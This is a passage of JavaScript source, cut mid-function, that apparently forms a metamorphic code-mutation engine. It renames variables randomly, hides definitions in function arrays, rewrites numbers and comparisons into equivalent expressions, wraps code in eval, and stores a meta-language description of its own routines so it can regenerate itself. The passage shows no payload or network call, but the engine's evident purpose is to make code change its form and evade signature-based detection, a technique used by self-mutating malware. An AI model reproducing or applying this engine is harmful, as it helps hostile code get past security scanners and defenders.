                            CodeToIntegrate+='function(){return '+VariableDefinition+';},';

                            OldMarker=OriginalCode.search('@X@');
                            if(OldMarker>SearchArrayEntries4||OldMarker==-1)
                            {   // replace old marker by new one
                                OriginalCode=OriginalCode.replace('@X@','');    // remove old marker 
                                OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','@X@')  // marker that at least here the function has to be included
                            }
                            else
                            {
                                OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','')  // remove line and keep old marker
                            }
                            OriginalCode=OriginalCode.replace(TmpVarNames[i],RandNameArr+'['+ArrayIndexCounter+']()');
                            ArrayIndexCounter++;
                        }
                        else
                        {
                            // function
                            RandFuncName=randomString();
                            FunctionNames.push(RandFuncName);
                            FunctionDefs.push('return '+VariableDefinition);
                            FunctionArgs.push('()');
                            OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','')
                            OriginalCode=OriginalCode.replace(TmpVarNames[i],RandFuncName+'()');                  
                        }
                    }
                }
            }
        }
        CodeToIntegrate=CodeToIntegrate.substring(0,CodeToIntegrate.length-1)+'];'+s(13)+s(10);
        OriginalCode=OriginalCode.replace('@X@',CodeToIntegrate)    
    }
    for(i=0;i<FunctionDefs.length;i++)
    {
        PositionForIntegration=FindPositionForCode(OriginalCode,Infinity);
        IntegrationPosition=PositionForIntegration[Math.floor(Math.random()*PositionForIntegration.length)];
        OriginalCode=OriginalCode.substring(0,IntegrationPosition)+'function '+FunctionNames[i]+FunctionArgs[i]+'@{'+FunctionDefs[i]+'@}'+s(13)+s(10)+OriginalCode.substring(IntegrationPosition);
    }
    return(OriginalCode);
}

FunctionDefs=[];    // contains names of functions
FunctionArgs=[];    // contains arguments of function, for instance '()' for no arguments
FunctionNames=[];   // contains content of function corresponding to the array FunctionDefs
VarDefs=[];         // contains names of variables
VarNames=[];        // contains content of variables corresponding to the array VarDefs
FunctionVariableFctName=[];   // contains name of functions 
FunctionVariableNameArray=[]; // contains arrays of variable/functionnames corresponding to the array FunctionVariableFctName      
RecordFunctionVariables=0;    // 0=no recording of functionnames; n>0: current recursion depth in functions
RecordFunctionVN=0;     // lowest depth variable name (everything else will be put into FunctionVariableNameArray)
RecordFunctionFN=0;     // lowest depth function name (everything else will be put into FunctionVariableNameArray)
DeriveRestrString="""";
NoDerivation1=0;


// REAL STUFF


MetaLevelLanguage='(VDef001|)def sVarDefs=[]';
MetaLevelLanguage+='__(VDef002|)def sVarNames=[]';
MetaLevelLanguage+='__(VDef003|)def sNoDerivation1=#n0n#';
MetaLevelLanguage+='__(VDef004|)def sFunctionDefs=[]';
MetaLevelLanguage+='__(VDef005|)def sFunctionArgs=[]';
MetaLevelLanguage+='__(VDef006|)def sFunctionNames=[]';
MetaLevelLanguage+='__(VDef007|)def sDeriveRestrString=#""""#';
MetaLevelLanguage+='__(VDef008|)def sRecordFunctionVariables=#n0n#';
MetaLevelLanguage+='__(VDef009|)def sRecordFunctionVN=#n0n#';
MetaLevelLanguage+='__(VDef010|)def sRecordFunctionFN=#n0n#';
MetaLevelLanguage+='__(VDef011|)def sFunctionVariableFctName=[]';
MetaLevelLanguage+='__(VDef012|)def sFunctionVariableNameArray=[]';
MetaLevelLanguage+='__(MetaDef|)def sMetaLevelLanguage=#""""#';
MetaLevelLanguage+='__(VDef014|)def sHierarchyOfCalls=#n0n#';
MetaLevelLanguage+='__(VDef015|)def DoIWriteMetaCode=#n0n#';

MetaLevelLanguage+='__(0100|)function fGiveMeString(argGiveMeString1)001';
    MetaLevelLanguage+='__(GMS100|)xreturn(#x1#O1String#.fromCharCode(°+argGiveMeString1+°)1O#1x#)';

MetaLevelLanguage+='__(0200|)function fGiveRandomNumber(argGiveRandomNumber1)001';
    MetaLevelLanguage+='__(GRN100|)xreturn(#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4°+argGiveRandomNumber1+°4x#2x#)1O#1x#)';

MetaLevelLanguage+='__(0300|)function fGiveRandomString()006';
    MetaLevelLanguage+='__(GRS100|)var vGiveRandomStringVarrndString=#""""#';
    MetaLevelLanguage+='__(GRS200|)var vGiveRandomStringVarRNum3=#x1#x2fGiveRandomNumber(#n10n#)2x#+#x3#n6n#3x#1x#';
    MetaLevelLanguage+='__(GRS300|GRS100,GRS200)while(var vGiveRandomStringC1=0$°+vGiveRandomStringC1+°!°+vGiveRandomStringVarRNum3+°?<@vGiveRandomStringC1=°+vGiveRandomStringC1+° +1)002'
        MetaLevelLanguage+='__(GRSA100|)var vGiveRandomStringSingleChar=fGiveMeString(#x1#x2fGiveRandomNumber(#x3#n26n#3x#)2x#+#x4#n97n#4x#1x#)'
        MetaLevelLanguage+='__(GRSA200|GRSA100)c+s(°+vGiveRandomStringVarrndString+°,°+vGiveRandomStringSingleChar+°)'
    MetaLevelLanguage+='__(GRS400|GRS300)xreturn(#x1°+vGiveRandomStringVarrndString+°1x#)';

MetaLevelLanguage+='__(0400|)function fIsNumber(argisNumber1)006';
    MetaLevelLanguage+='__(isNumber100|)if(#O1°+argisNumber1+°#.charCodeAt(#n0n#)1O#!#n47n#?>)003';
        MetaLevelLanguage+='__(isNumberA100|)if(#O1°+argisNumber1+°#.charCodeAt(#n0n#)1O#!#n58n#?<)001';
            MetaLevelLanguage+='__(isNumberAA100|)xreturn(#x1#n1n#1x#)';
        MetaLevelLanguage+='__(isNumberB100|)000';          // else part is empty
    MetaLevelLanguage+='__(isNumber200|)000';               // else part
    MetaLevelLanguage+='__(isNumber300|isNumber100)xreturn(#x1#n0n#1x#)';

MetaLevelLanguage+='__(0500|)function fGetAntiLogic(argfGetAntiLogic1)014';
    MetaLevelLanguage+='__(GetAntiLogic0100|)var GALRValue=#x1°+argfGetAntiLogic1+°1x#';
    MetaLevelLanguage+='__(GetAntiLogic0200|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#""<""#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#"">""#';
    MetaLevelLanguage+='__(GetAntiLogic0300|)000';
    MetaLevelLanguage+='__(GetAntiLogic0400|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#""<=""#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#"">=""#';
    MetaLevelLanguage+='__(GetAntiLogic0500|)000';
    MetaLevelLanguage+='__(GetAntiLogic0600|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#"">""#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#""<""#';
    MetaLevelLanguage+='__(GetAntiLogic0700|)000';
    MetaLevelLanguage+='__(GetAntiLogic0800|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#"">=""#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#""<=""#';
    MetaLevelLanguage+='__(GetAntiLogic0900|)000';
    MetaLevelLanguage+='__(GetAntiLogic1000|GetAntiLogic0200,GetAntiLogic0400,GetAntiLogic0600,GetAntiLogic0800)xreturn(#x1°+GALRValue+°1x#)';

MetaLevelLanguage+='__(0600|)function fRemoveVariableMask(argRemoveVariableMask1)005';
    MetaLevelLanguage+='__(RVM100|)while($#x1#O1°+argRemoveVariableMask1+°#.indexOf(#x2fGiveMeString(#n176n#)2x#+#x3fGiveMeString(#n43n#)3x#)1O#1x#!#n-1n#?!=@)001';
        MetaLevelLanguage+='__(RVMA100|)y°+argRemoveVariableMask1+°=#x1#O1°+argRemoveVariableMask1+°#.replace(#x2fGiveMeString(#x3#n176n#3x#)2x#+#x4fGiveMeString(#x5#n43n#5x#)4x#,#x6""""6x#)1O#1x#';
    MetaLevelLanguage+='__(RVM200|)while($#x1#O1°+argRemoveVariableMask1+°#.indexOf(#x2fGiveMeString(#n43n#)2x#+#x3fGiveMeString(#n176n#)3x#)1O#1x#!#n-1n#?!=@)001';
        MetaLevelLanguage+='__(RVMA100|)y°+argRemoveVariableMask1+°=#x1#O1°+argRemoveVariableMask1+°#.replace(#x2fGiveMeString(#x3#n43n#3x#)2x#+#x4fGiveMeString(#x5#n176n#5x#)4x#,#x6""""6x#)1O#1x#';
    MetaLevelLanguage+='__(RVM300|RVM100,RVM200)xreturn(#x1°+argRemoveVariableMask1+°1x#)';


MetaLevelLanguage+='__(0700|)function fRandomizeFunction()001';
    MetaLevelLanguage+='__(RandFunct100|)xreturn(#x1#x2fGiveRandomNumber(#x323x#)2x#-#x414x#1x#)';


MetaLevelLanguage+='__(0800|)function fCreateNumeric(argCreateNumeric)030';
    MetaLevelLanguage+='__(CrNum0100|)yargCreateNumeric=#x3parseInt(#x1°+argCreateNumeric+°1x#,#x2#n10n#2x#)3x#';
    MetaLevelLanguage+='__(CrNum0200|)var CreateNumericType=#x1fGiveRandomNumber(#x2#n8n#2x#)1x#';
    MetaLevelLanguage+='__(CrNum0300|CrNum0100,CrNum0200)if(°+argCreateNumeric+°!#n10000n#?>)001';
        MetaLevelLanguage+='__(CrNumA100|)yCreateNumericType=#x1#n5n#1x#';
    MetaLevelLanguage+='__(CrNum0400|)000';
    MetaLevelLanguage+='__(CrNum0700|CrNum0300)if(°+argCreateNumeric+°!#n0n#?>=)005';
        MetaLevelLanguage+='__(CrNumA100|)if(°+argCreateNumeric+°!#n255n#?<=)003';
            MetaLevelLanguage+='__(CrNumAA100|)if(fGiveRandomNumber(#n4n#)!#n0n#?!=)001';
                MetaLevelLanguage+='__(CrNumAAA100|)xreturn(#x1#x6°+FullArray+°6x#[#x2°+argCreateNumeric+°2x#][#x3fGiveRandomNumber(#x4#O1°+FullArray+°[#x5°+argCreateNumeric+°5x#]#.length1O#4x#)3x#]1x#)';
            MetaLevelLanguage+='__(CrNumAB200|)000';
        MetaLevelLanguage+='__(CrNumA200|)000';
    MetaLevelLanguage+='__(CrNum0800|)000';
    MetaLevelLanguage+='__(CrNum0900|CrNum0100)var CreateNumericRnd=#x1#O3Math#.abs(#x3#O1Math#.floor(#x4#x5#O2Math#.random()2O#*#x70.97x#5x#*#x6°+argCreateNumeric+°6x#4x#)1O#3x#)3O#+#x212x#1x#';
    MetaLevelLanguage+='__(CrNum1000|CrNum0700,CrNum0900)if(°+argCreateNumeric+°!°+CreateNumericRnd+°?<)003';
        MetaLevelLanguage+='__(CrNumA100|)if(°+CreateNumericType+°!#n0n#?==)001';
            MetaLevelLanguage+='__(CrNumAA100|)xreturn(fDeriveVC(°+argCreateNumeric+°,#n200n#))'
        MetaLevelLanguage+='__(CrNumA200|)000';
    MetaLevelLanguage+='__(CrNum1100|)000';
    MetaLevelLanguage+='__(CrNum1200|CrNum1000)if(°+CreateNumericType+°!#n0n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#""(""#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+°-°+CreateNumericRnd+°)4x#+#x5#""+""#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#"")""#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1300|)000';
    MetaLevelLanguage+='__(CrNum1400|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n1n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#""(""#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+° + °+CreateNumericRnd+°)4x#+#x5#""-""#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#"")""#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1500|)000';
    MetaLevelLanguage+='__(CrNum1600|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n2n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#""(""#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+°*°+CreateNumericRnd+°)4x#+#x5#""/""#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#"")""#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1700|)000';
    MetaLevelLanguage+='__(CrNum1800|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n2n#?>)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1fDeriveVC(#x2°+argCreateNumeric+°2x#,#x3#n200n#3x#)1x#)';
    MetaLevelLanguage+='__(CrNum1900|)000';




MetaLevelLanguage+='__(0900|)function fCreateLogic(argfCreateLogic)027';
    MetaLevelLanguage+='__(CrLogic0100|)ysDeriveRestrString=#""""#';
    MetaLevelLanguage+='__(CrLogic0200|)var CLarg1=#x1#O1°+argfCreateLogic+°#.substring(#x2#n0n#2x#,#O2°+argfCreateLogic+°#.indexOf(#x3#""!""#3x#)2O#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0300|)var CLarg2=#x1#O1°+argfCreateLogic+°#.substring(#x2#x4#O2°+argfCreateLogic+°#.indexOf(#x7#""!""#7x#)2O#4x#+#x3#n1n#3x#2x#,#x5#O3°+argfCreateLogic+°#.indexOf(#x6#""?""#6x#)3O#5x#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0400|)var CLlogicoperator=#x1#O1°+argfCreateLogic+°#.substring(#x2#x3#O2°+argfCreateLogic+°#.indexOf(#""?""#)2O#3x#+#x4#n1n#4x#2x#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0500|CrLogic0400)var CLantilogic=#x1fGetAntiLogic(#x2°+CLlogicoperator+°2x#)1x#';
    MetaLevelLanguage+='__(CrLogic0600|)var CLDeriv=#x1fDeriveRestrictVC1x#';
    MetaLevelLanguage+='__(CrLogic0700|CrLogic0300,CrLogic0600)if(#x1fIsNumber(#x2°+CLarg2+°2x#)1x#!#n1n#?==)001';
        MetaLevelLanguage+='__(CrLogicA100|)yCLDeriv=#x1fDeriveVC1x#';
    MetaLevelLanguage+='__(CrLogic0800|)000';
    MetaLevelLanguage+='__(CrLogic0900|CrLogic0100,CrLogic0200)if(#x1°+sNoDerivation1+°1x#!#n0n#?==)001';
        MetaLevelLanguage+='__(CrLogicA100|)yCLarg1=#x3fDeriveRestrictVC(#x1°+CLarg1+°1x#,#x2#n24n#2x#)3x#';
    MetaLevelLanguage+='__(CrLogic1000|)000';
    MetaLevelLanguage+='__(CrLogic1100|CrLogic0100,CrLogic0300,CrLogic0700)yCLarg2=#x3°+CLDeriv+°(#x1°+CLarg2+°1x#,#x2#n50n#2x#)3x#';
    MetaLevelLanguage+='__(CrLogic1200|)var CLRndNum=#x1fGiveRandomNumber(#n2n#)1x#';
    MetaLevelLanguage+='__(CrLogic1300|CrLogic0400,CrLogic0900,CrLogic1100,CrLogic1200)if(°+CLRndNum+°!#n0n#?==)004';
        MetaLevelLanguage+='__(CrLogicA100|)var CLRV=#""""#';
        MetaLevelLanguage+='__(CrLogicA200|CrLogicA100)c+s(°+CLRV+°,#x1°+CLarg1+°1x#)';
        MetaLevelLanguage+='__(CrLogicA300|)c+s(°+CLlogicoperator+°,#x1°+CLarg2+°1x#)';
        MetaLevelLanguage+='__(CrLogicA400|CrLogicA200,CrLogicA300)c+s(°+CLRV+°,#x1°+CLlogicoperator+°1x#)';
    MetaLevelLanguage+='__(CrLogic1400|)000';
    MetaLevelLanguage+='__(CrLogic1500|CrLogic0500,CrLogic0900,CrLogic1100,CrLogic1200)if(#x1°+CLRndNum+°1x#!#n1n#?==)004';
        MetaLevelLanguage+='__(CrLogicA100|)var CLRV=#""""#';
        MetaLevelLanguage+='__(CrLogicA200|CrLogicA100)c+s(°+CLRV+°,#x1°+CLarg2+°1x#)';
        MetaLevelLanguage+='__(CrLogicA300|)c+s(°+CLantilogic+°,#x1°+CLarg1+°1x#)';
        MetaLevelLanguage+='__(CrLogicA400|CrLogicA200,CrLogicA300)c+s(°+CLRV+°,#x1°+CLantilogic+°1x#)';
    MetaLevelLanguage+='__(CrLogic1600|)000';
    MetaLevelLanguage+='__(CrLogic1700|CrLogic1300,CrLogic1500)xreturn(#x1°+CLRV+°1x#)';


MetaLevelLanguage+='__(1000|)function fDeriveVC(argDeriveVC1,argDeriveVC2)009';
    MetaLevelLanguage+='__(DVC0100|)var DVCRNum=#x2fGiveRandomNumber(#x1°+argDeriveVC2+°1x#)2x#';
    MetaLevelLanguage+='__(DVC0200|DVC0100)if(#x1°+DVCRNum+°1x#!2?<)005';
        MetaLevelLanguage+='__(DVCA100|)var DVCTmpName=#x1fGiveRandomString()1x#';    
        MetaLevelLanguage+='__(DVCA200|)x#O1sVarDefs#.push(#x1°+argDeriveVC1+°1x#)1O#';
        MetaLevelLanguage+='__(DVCA300|DVCA100)x#O1sVarNames#.push(#x1°+DVCTmpName+°1x#)1O#';
        MetaLevelLanguage+='__(DVCA400|DVCA200,DVCA300)var DVCRname=#x3fDeriveVC(#x1°+DVCTmpName+°1x#,#x2#n30n#2x#)3x#';
        MetaLevelLanguage+='__(DVCA500|DVCA400)xreturn(#x1°+DVCRname+°1x#)';
    MetaLevelLanguage+='__(DVC0300|)000';
    MetaLevelLanguage+='__(DVC0400|DVC0200)xreturn(#x1°+argDeriveVC1+°1x#)';


MetaLevelLanguage+='__(1100|)function fCreateVariableListForFunctionCalls(argCVLCodeStr,argCVLArrOrig,argCVLArrRnd)010';
    MetaLevelLanguage+='__(CVL0100|)var CopyexecCode=#x1#O1°+argCVLCodeStr+°#.toString()1O#1x#';
    MetaLevelLanguage+='__(CVL0200|CVL0100)while($#x1#O1°+CopyexecCode+°#.indexOf(#x2#x3fGiveMeString(#x5#n176n#5x#)3x#+#x4fGiveMeString(#x6#n43n#6x#)4x#2x#)1O#1x#!-1?!=@)002';
        MetaLevelLanguage+='__(CVLA100|)x#O1°+argCVLArrOrig+°#.push(#x1#O2°+CopyexecCode+°#.substring(#x2#O3°+CopyexecCode+°#.indexOf(#x4fGiveMeString(#n176n#)+fGiveMeString(#n43n#)4x#)3O#2x#+#x3#n2n#3x#,#x4#O4°+CopyexecCode+°#.indexOf(#x5#x6fGiveMeString(#n43n#)6x#+#x7fGiveMeString(#n176n#)7x#5x#)4O#4x#)2O#1x#)1O#';
        MetaLevelLanguage+='__(CVLA200|CVLA100)y°+CopyexecCode+°=#x1#O1°+CopyexecCode+°#.substring(#x2#x4#O2°+CopyexecCode+°#.indexOf(#x5#x6fGiveMeString(#n43n#)6x#+#x7fGiveMeString(#n176n#)7x#5x#)2O#4x#+#x3#n2n#3x#2x#)1O#1x#';    
    MetaLevelLanguage+='__(CVL0300|CVL0200)while(var CVLFcount1=#x1#n0n#1x#$#x2°+CVLFcount1+°2x#!#x3#O1°+argCVLArrOrig+°#.length1O#3x#?<@°+CVLFcount1+°=#x1#x2°+CVLFcount1+°2x#+#n1n#1x#)004';
        MetaLevelLanguage+='__(CVLA100|)var RandNameForFuncArg=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(CVLA200|CVLA100)y#O1°+argCVLArrRnd+°#.push(#x1°+RandNameForFuncArg+°1x#)1O#';
        MetaLevelLanguage+='__(CVLA300|CVLA200)while($#x1#O1°+argCVLCodeStr+°#.indexOf(#x2°+argCVLArrOrig+°[#x3°+CVLFcount1+°3x#]2x#)1O#1x#!#x1#n-1n#1x#?!=@)001';
            MetaLevelLanguage+='__(CVLAA100|)y°+argCVLCodeStr+°=#x1#O1°+argCVLCodeStr+°#.replace(#x2°+argCVLArrOrig+°[#x3°+CVLFcount1+°3x#]2x#,#x4°+RandNameForFuncArg+°4x#)1O#1x#';
    MetaLevelLanguage+='__(CVL0400|CVL0300)xreturn(#x1°+argCVLCodeStr+°1x#)';
    

MetaLevelLanguage+='__(1200|)function fGetVariableList(argGetVariableList)006';
    MetaLevelLanguage+='__(GVL0100|)var GVLVarListRV=#""""#';
    MetaLevelLanguage+='__(GVL0200|GVL0100)while($#x1#O1°+argGetVariableList+°#.indexOf(#x2#x3fGiveMeString(#x7#n176n#7x#)3x#+#x4fGiveMeString(#x6#n43n#6x#)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)003';    
        MetaLevelLanguage+='__(GVLA100|)c+s(°+GVLVarListRV+°,#x1#O1°+argGetVariableList+°#.substring(#x2#O2°+argGetVariableList+°#.indexOf(fGiveMeString(#n176n#)+fGiveMeString(#n43n#))2O#2x#+#n2n#,#x3#O3°+argGetVariableList+°#.indexOf(#x6#x4fGiveMeString(#n43n#)4x#+#x5fGiveMeString(#n176n#)5x#6x#)3O#3x#)+#"",""#1O#1x#)';
        MetaLevelLanguage+='__(GVLA200|GVLA100)y°+argGetVariableList+°=#x1#O1°+argGetVariableList+°#.replace(#x2#x3fGiveMeString(#n176n#)3x#+#x4fGiveMeString(#n43n#)4x#2x#,#x5#""""#5x#)1O#1x#';
        MetaLevelLanguage+='__(GVLA300|GVLA100)y°+argGetVariableList+°=#x1#O1°+argGetVariableList+°#.replace(#x2#x3fGiveMeString(#n43n#)3x#+#x4fGiveMeString(#n176n#)4x#2x#,#x5#""""#5x#)1O#1x#';
    MetaLevelLanguage+='__(GVL0300|GVL0200)xreturn(#x1#x2fGiveMeString(#n95n#)2x#+#x4fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)5x#+#x6fGiveMeString(#n42n#)6x#+ #x3#O1°+GVLVarListRV+°#.substring(#n0n#,#O2°+GVLVarListRV+°#.length2O#-#n1n#)1O#3x#+#x7fGiveMeString(#n42n#)7x#+#x8fGiveMeString(#n95n#)8x#+#x9fGiveMeString(#n42n#)9x#+fGiveMeString(#n95n#)1x#)';


MetaLevelLanguage+='__(1300|)function fRemoveVariableIndicator(argRemoveVariableIndicator)003';
    MetaLevelLanguage+='__(RVI0100|)while($#x1#O1°+argRemoveVariableIndicator+°#.indexOf(#x3#x2fGiveMeString(#n95n#)2x#+#x4fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)5x#+#x6fGiveMeString(#n42n#)6x#3x#)1O#1x#!#n-1n#?!=@)001';
        MetaLevelLanguage+='__(RVIA200|)y°+argRemoveVariableIndicator+°=#x1#O1°+argRemoveVariableIndicator+°#.substring(#n0n#,#x2#O2°+argRemoveVariableIndicator+°#.indexOf(#x3#x4fGiveMeString(#n95n#)+fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)+fGiveMeString(#n42n#)5x#3x#)2O#2x#)1O#+ #O3°+argRemoveVariableIndicator+°#.substring(#x6#O4°+argRemoveVariableIndicator+°#.indexOf(#x7#x8fGiveMeString(#n42n#)+fGiveMeString(#n95n#)8x#+#x9fGiveMeString(#n42n#)+fGiveMeString(#n95n#)9x#7x#)4O#+#n4n#6x#)3O#1x#';
    MetaLevelLanguage+='__(RVI0200|RVI0100)xreturn(#x1°+argRemoveVariableIndicator+°1x#)';



MetaLevelLanguage+='__(1400|)function fDeriveRestrictVC(argDeriveRestrictVC1,argDeriveRestrictVC2,argDeriveRestrictVC3)044';
    MetaLevelLanguage+='__(DRVC0100|)var DRWhichRnd=#x1fGiveRandomNumber(#x2°+argDeriveRestrictVC2+°2x#)1x#';
    MetaLevelLanguage+='__(DRVC0150|DRVC0100)if(#x1#O1°+argDeriveRestrictVC1+°#.toString().indexOf(#x2#""ev""#+#""al(""#2x#)1O#1x#!#x3#n-1n#3x#?!=)001';
        MetaLevelLanguage+='__(DRVCA150|)c+n(°+DRWhichRnd+°,#x1#n7n#1x#)';
    MetaLevelLanguage+='__(DRVC0160|)000';
    MetaLevelLanguage+='__(DRVC0200|DRVC0150)if(#x1°+DRWhichRnd+°1x#!#x2#n10n#2x#?>)001';
        MetaLevelLanguage+='__(DRVCA100|)xreturn(#x1°+argDeriveRestrictVC1+°1x#)';
    MetaLevelLanguage+='__(DRVC0300|)000';
    MetaLevelLanguage+='__(DRVC0400|)var DRRndStr=#x1fGiveRandomString()1x#';
    MetaLevelLanguage+='__(DRVC0500|DRVC0200,DRVC0400)if(#x1°+DRWhichRnd+°1x#!#x2#n8n#2x#?>)017';
        MetaLevelLanguage+='__(DRVCZ100|)if(#x1°+argDeriveRestrictVC3+°1x#!#x2#n1n#2x#?!=)015';
            MetaLevelLanguage+='__(DRVCA100|)if(#x1fGiveRandomNumber(#x2#n2n#2x#)1x#!#x3#n0n#3x#?==)005';  
                MetaLevelLanguage+='__(DRVCAA050|)c+s(°+sDeriveRestrString+°,#x1#""var ""#1x#)';            
                MetaLevelLanguage+='__(DRVCAA100|DRVCAA050)c+s(°+sDeriveRestrString+°,#x1°+DRRndStr+°1x#)';
                MetaLevelLanguage+='__(DRVCAA200|DRVCAA100)c+s(°+sDeriveRestrString+°,#x1#""=""#1x#)';
                MetaLevelLanguage+='__(DRVCAA300|DRVCAA200)c+s(°+sDeriveRestrString+°,#x1°+argDeriveRestrictVC1+°1x#)';
                MetaLevelLanguage+='__(DRVCAA400|DRVCAA300)c+s(°+sDeriveRestrString+°,#x1#x2fGiveMeString(64)2x#+#x3fGiveMeString(59)3x#1x#)';
            MetaLevelLanguage+='__(DRVCA200|)007';
                MetaLevelLanguage+='__(DRVCAA100|)var DRVCtmp=#x1#""var ""#1x#';
                MetaLevelLanguage+='__(DRVCAA200|DRVCAA100)c+s(°+DRVCtmp+°,#x1°+DRRndStr+°1x#)';
                MetaLevelLanguage+='__(DRVCAA300|DRVCAA200)c+s(°+DRVCtmp+°,#x1#""=""#1x#)';
                MetaLevelLanguage+='__(DRVCAA400|DRVCAA300)c+s(°+DRVCtmp+°,#x1°+argDeriveRestrictVC1+°1x#)';
                MetaLevelLanguage+='__(DRVCAA500|DRVCAA400)c+s(°+DRVCtmp+°,#x1#x2fGiveMeString(#x5#n64n#5x#)2x#+#x3fGiveMeString(#x4#n59n#4x#)3x#1x#)';
                MetaLevelLanguage+='__(DRVCAA600|DRVCAA500)c+s(°+DRVCtmp+°,#x1°+sDeriveRestrString+°1x#)';
                MetaLevelLanguage+='__(DRVCAA700|DRVCAA600)y°+sDeriveRestrString+°=#x1°+DRVCtmp+°1x#';
            MetaLevelLanguage+='__(DRVCA300|DRVCA100)xreturn(#x1°+DRRndStr+°1x#)';
        MetaLevelLanguage+='__(DRVCZ200|)000';            
    MetaLevelLanguage+='__(DRVC0600|)000';
    MetaLevelLanguage+='__(DRVC0700|DRVC0500)if(#x1°+DRWhichRnd+°1x#!#x2#n6n#2x#?>)004';
        MetaLevelLanguage+='__(DRVCA100|)var DRVariableString=#x1fGetVariableList(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';
        MetaLevelLanguage+='__(DRVCA200|DRVCA100)y°+argDeriveRestrictVC1+°=#x1fRemoveVariableMask(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';
        MetaLevelLanguage+='__(DRVCA250|DRVCA100)y°+argDeriveRestrictVC1+°=#x1fRemoveVariableIndicator(#x2#O1°+argDeriveRestrictVC1+°#.toString()1O#2x#)1x#';         
        MetaLevelLanguage+='__(DRVCA300|DRVCA200,DRVCA250)xreturn(#x1#x2#""eval(""#2x#+#x3fCreateString(°+argDeriveRestrictVC1+°)3x#+#x4#"")""#4x#+ #x5°+DRVariableString+°5x#1x#)';
    MetaLevelLanguage+='__(DRVC0800|)000';
    MetaLevelLanguage+='__(DRVC0900|)var DRVariableListLL=[]';
    MetaLevelLanguage+='__(DRVC1000|)var DRVariableListRnd=[]';
    MetaLevelLanguage+='__(DRVC1100|DRVC0700,DRVC0900,DRVC1000)y°+argDeriveRestrictVC1+°=#x1fCreateVariableListForFunctionCalls(#x2°+argDeriveRestrictVC1+°2x#,#x3°+DRVariableListLL+°3x#,#x4°+DRVariableListRnd+°4x#)1x#';
    MetaLevelLanguage+='__(DRVC1200|DRVC0700)y°+sFunctionNames+°.push(#x1°+DRRndStr+°1x#)';
    MetaLevelLanguage+='__(DRVC1300|DRVC1100)y°+sFunctionArgs+°.push(#x1#x2#""(""#2x#+ #x3°+DRVariableListRnd+°.join()3x#+#x4#"")""#4x#1x#)';
    MetaLevelLanguage+='__(DRVC1400|DRVC1100)y°+sFunctionDefs+°.push(#x1#x2#""return ""#2x#+#x3 °+argDeriveRestrictVC1+°3x#1x#)';
    MetaLevelLanguage+='__(DRVC1500|DRVC1100)var DRReturnValue=#x1#O1°+DRVariableListLL+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#n176n#)4x#+#x5fGiveMeString(#n44n#)5x#+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#x9#n43n#9x#)7x#2x#)1O#1x#';
    MetaLevelLanguage+='__(DRVC1600|DRVC1500)if(#x1#O1°+DRVariableListLL+°#.length1O#1x#!#x2#n0n#2x#?>)001';
        MetaLevelLanguage+='__(DRVCA100|)y°+DRReturnValue+°=#x1#x6fGiveMeString(#x2#n176n#2x#)6x#+#x7fGiveMeString(#x3#n43n#3x#)7x#+ #x8°+DRReturnValue+°8x# +#x9fGiveMeString(#x4#n43n#4x#)+fGiveMeString(#x5#n176n#5x#)9x#1x#';
    MetaLevelLanguage+='__(DRVC1700|)000';
    MetaLevelLanguage+='__(DRVC1800|DRVC1200,DRVC1300,DRVC1400,DRVC1500,DRVC1600)xreturn(#x1#x2°+DRRndStr+°2x# +#x3#""(""#3x#+ #x4°+DRReturnValue+°4x# +#x5#"")""#5x#1x#)';



MetaLevelLanguage+='__(1500|)function fCreateExecution(argCreateExecution1,argCreateExecution2)049';
    MetaLevelLanguage+='__(CE0100|)var CERnd1=#x1fGiveRandomNumber(#x2#n8n#2x#)1x#';
    MetaLevelLanguage+='__(CE0200|CE0100)if(#x1°+argCreateExecution2+°1x#!#x2#n1n#2x#?==)001';      
        MetaLevelLanguage+='__(CEA100|)y°+CERnd1+°=#x1fGiveRandomNumber(#x2#n5n#2x#)1x#'; 
